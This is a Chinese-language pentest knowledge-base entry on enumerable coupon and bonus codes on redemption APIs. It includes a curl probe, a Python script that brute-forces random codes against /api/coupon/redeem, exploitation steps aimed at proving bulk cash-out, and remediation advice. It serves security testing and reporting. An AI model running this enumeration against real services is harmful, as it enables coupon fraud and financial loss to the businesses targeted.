---
title: 券码 / 彩金码可枚举（批量领取与套现）
cve: 无（业务逻辑）
severity: high
cvss: 8.3
product: 自研活动/兑换码系统
versions: 任意
ports: 80, 443
keywords: 券码, 彩金, 兑换, 枚举, coupon, 领取
entry: /api/coupon/redeem  /api/promo/exchange
verified: false
sources: 公开资料整理（业务逻辑类，无 CVE）
---

## 指纹

```
POST /api/coupon/redeem {"code":"ABCD1234"}
GET  /api/promo/list
```

## 前置条件

- 普通会员；码长度短或有序（6-8 位字母数字）。

## PoC

```bash
# 1) 先试自己的码，确认响应差异（成功/已用/不存在）
curl -s -X POST https://target/api/coupon/redeem -H "Authorization: Bearer <t>" \
  -H 'Content-Type: application/json' -d '{"code":"AAAA0001"}'

# 2) 小字典枚举（限速，先 200 个证明可行性）
python3 - <<'PY'
import requests, random, string
t="https://target"; tk="<token>"
ok=[]
for _ in range(200):
    code=''.join(random.choices(string.ascii_uppercase+string.digits, k=8))
    r=requests.post(f"{t}/api/coupon/redeem", json={"code":code},
                    headers={"Authorization":f"Bearer {tk}"}, timeout=5)
    if r.status_code==200 and '"code":0' in r.text: ok.append((code, r.text[:80]))
print(len(ok), ok[:3])
PY
# 判定：出现成功领取 = 命中（并发会更快）
```

## 利用步骤

1. 先看码规则（长度/字符集/是否连续）；
2. 200 次小样本证明可枚举，别大规模刷；
3. 命中后换算金额，写清"可批量套现"的危害；
4. 证据：成功码 + 领取响应 + 余额变化。

## 修复与缓解

- 码长 ≥12 随机 + 一次性 + 绑定活动与用户；领取失败计数与限速；
- 兑换接口加行为风控（同 IP/设备高频拒绝）。

## 参考

- OWASP WSTG-BUSL-04；CWE-799。
